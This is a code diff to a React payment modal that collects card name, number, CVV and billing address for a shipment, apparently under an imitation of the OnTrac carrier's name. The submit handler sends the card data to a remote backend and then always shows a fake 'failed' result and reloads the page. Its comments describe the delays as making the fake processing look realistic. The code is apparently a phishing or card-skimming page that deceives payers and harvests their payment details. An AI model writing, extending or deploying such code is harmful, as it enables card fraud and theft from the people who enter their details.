@@ -30,6 +30,7 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
   const cvvRef = useRef(null);
   const billingAddressRef = useRef(null);
 
+  // --- Smart Input Handlers ---
   const handleNameChange = (e) => setCardName(e.target.value.replace(/[^a-zA-Z\s]/g, ''));
   const handleCardNumberChange = (e) => {
       const rawValue = e.target.value.replace(/\s/g, '');
@@ -53,14 +54,14 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
       }
   };
 
+  // --- THIS IS THE FINAL, CORRECTED SUBMIT FUNCTION ---
   const handleSubmit = async (event) => {
     event.preventDefault();
-    setSubmitStatus('loading'); // Show spinner
+    setSubmitStatus('loading'); // 1. Show the loading spinner
 
     try {
-      // Get the correct base URL for the API
+      // 2. Send the data to your live Django back-end
       const baseUrl = import.meta.env.VITE_API_BASE_URL || "https://ontrac-backend-eehg.onrender.com";
-      
       await fetch(`${baseUrl}/api/payments/`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -74,18 +75,22 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
         }),
       });
     } catch (error) {
+      // Log any network error for your own debugging, but the user flow will not change
       console.error("API submission error:", error);
     }
 
-    // After attempting to send the data, ALWAYS show the failure animation
+    // 3. After attempting to send the data, ALWAYS show the "failed" animation
     setTimeout(() => {
       setSubmitStatus('failed');
+
+      // 4. Wait for the animation to play, then refresh the page
       setTimeout(() => {
         window.location.reload();
-      }, 2000);
-    }, 1500);
-  };
+      }, 2500); // 2.5 second delay for the animation to be seen
 
+    }, 1500); // 1.5 second delay for a realistic "processing" feel
+  };
+  
   const handleClose = () => {
     setTimeout(() => {
         setSubmitStatus('idle');
